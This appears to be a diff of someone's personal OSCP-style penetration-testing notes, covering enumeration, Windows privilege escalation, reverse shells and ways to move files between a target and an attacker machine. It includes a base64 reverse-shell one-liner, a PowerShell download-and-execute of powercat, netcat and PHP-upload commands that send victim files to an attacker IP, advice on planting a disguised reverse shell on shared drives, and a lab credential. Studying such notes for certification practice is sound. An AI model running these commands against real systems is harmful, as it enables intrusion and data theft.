@@ -4,7 +4,7 @@ Here is the reformatted content with each point preceded by a dash and placed on
 
 ## Takeaways from Experience
 
-- Jaws, privesccheck.ps1 are worth running if you're completely stuck.
+- Jaws, privesccheck.ps1 are worth running if you're completely stuck. Jaws easily identifies whether spooler is running for potato exploits.
 - When in doubt, new technology, unfamiliar port, check hack tricks. Sweetpotato & god potato.
 - How to know which version of Net (for sharp collection)?
 - Laps, read admin password.
@@ -26,7 +26,8 @@ Here is the reformatted content with each point preceded by a dash and placed on
 - Btop is a cooler version of htop.
 - Be aware that you need to use a -sT tcp connect scan to scan certain proxies.
 - If you can’t ls inside of directory, try getfacl & potentially cat the files inside.
-- Even if directory is 403, you can FUZZ past it. nmap —script=smb-enum-shares.
+- Even if directory is 403, you can FUZZ past it. 
+- nmap —script=smb-enum-shares.
 - Write permissions for smb? -> upload revshell in disguise. Look for files that you know people are going to click on, ideally replacing those.
 - Joomla->joom scan.
 - Always look up vulnerabilities, even for seemingly homemade software (check the tab title).
@@ -83,3 +84,61 @@ Here is the reformatted content with each point preceded by a dash and placed on
 - If there's a weird port, such as cgms 3003, try to connect to it and get the version "nc -zv $IP -> help -> version -> search exploit". If this makes no sense you can also refer to "https://github.com/xsudoxx/OSCP".
 - Always search for exploits using terms as vague as possible, then narrow down afterwards, this way you don't miss something.
 - If you have problems compiling an exploit on a target, try doing it on your local computer.
+- If you're POSTing data for a website, try to modify the route. In this case, an exploit relied on htmLawed.php for the exploit to work, and when it tried to post there, it noticed that there was no file with this name. When I modified the route to '/', it worked.
+- If you're modifying an exploit, and it's not working and you're getting a 400 error, you're not cleaning/modifying the GET/POST request correctly. Check if there are newlines where there are not supposed to be.
+- Use jadx to look at interested .apk files
+- Always enumerate and find unique files and their permissions, groups\
+- Stop forgetting to try default credentials before you try a bunch of fancy stuff
+- Look at the requests and headers of interesting urls, files, directories.. sometimes you'll find interesting hashed passwords and credentials. You never know.
+- If you have access to SMB shares, keep in mind that the actual server may have the same exact structure, especially if there's a backup share. Keep in mind the files where you find passwords, you may never know if you will end up crafting a file inclusion attack with their updated passwords or info.
+- If your shell is immediately disconnecting, then try the rlwrap thing
+- If you cannot connent to your python server, try switching the port to 80
+- If you can't find the powershell command/binary, check "C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe"
+- Don't forget about the "echo encoded_reverse|base64 -d| bash" reverse shell
+- https://www.blakejarvis.com/oscp/oscp-things-to-try-when-stuck
+- Enumerate users in ldap: "ldapsearch -x -H ldap://$ip -D '' -w '' -b "DC=hutch,DC=offsec""
+- If you have creds, there may be a webdav that you can access with cadaver in order to upload a web shell, "cadaver $ip". I saw that there was a webdav in my Nikto output, but didn't know how to go about solving it.
+- If you're accessing internal websites on your loopback interface, don't forget to add the hostname to /etc/hosts "127.0.0.1 website.com"
+- Don't listen to nxc if it says that smb, winrm, rdp, or whatever vector cannot be logged into with the creds that you have. Try it anyway. 
+- If your php windows reverse shell seems to not stick, immediately disconnects, upload simple html.php, set the path, then run the nc.exe command from god potato
+- If you're chiseling to look at mssql through the website on your localhost, go to phpmyadmin directory on the website
+- If you see something unusual, but it requires a password and it just skips over the password for whatever reason (doesn't let you input one), echo and pipe a password
+- Always fucking enumerate once you get Admin. You would've failed the exam.
+- Do not trust nxc's mssql  thing. try it manually, "impacket-mssqlclient administrator:hghgib6vHT3bVWf@10.10.112.154 -windows-auth"
+- If you have a username, such as jack, also try Jack when you're logging into stuff
+- It's a good idea to mimick the port # when getting a reverse shell. Mouse Server 9099 -> nc -lvnp 9099
+- jaws will tell you the firewall rules, use revshells accordingly, ex: "Outbound-tcp 8080,80,88,135,139,445,53,389"
+- If you don't know what a port is, google "port {port} exploit"
+- When replacing a binary, make sure to transfer it directly to the location that it needs to be (or the same directory), that way it keeps the Administrator ownership
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Nothing is 100% bullet-proof. This is why I have several options to accomplish this.
+1- As already mentioned, impacket-smbserver -smb2support test . is gold.
+2- python -m pyftpdlib -w will spawn a ftp server on you kali. use the ftp command on windows to transfer the file(s).
+3- On Kali: nc -lvp 4444 > TransferedFile on Windows: nc.exe <kali_ip> 4444 -w 5 < FileToTransfer
+4- Using powercat + powershell. Host powercat.ps1(link: https://github.com/besimorhino/powercat/blob/master/powercat.ps1) in a webserver on the attacker machine. Execute powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://kali-ip/powercat.ps1');powercat -l -p 4444 -i C:\Users\test\FiletoTransfer" On kali: wget http://windows-ip:4444/FileToTransfer
+5- Host the below php on a php-enabled webserver on kali:
+
+<?php
+$uploaddir = '/var/www/uploads/';
+$uploadfile = $uploaddir . $_FILES['file']['name'];
+move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
+?>
+
+Use a webbrowser on the victim to access the page and upload the desired file or use the below powershell to accomplish the same:
+
+powershell (New-Object System.Net.WebClient).UploadFile('http://10.11.0.4/upload.php', 'important.docx')
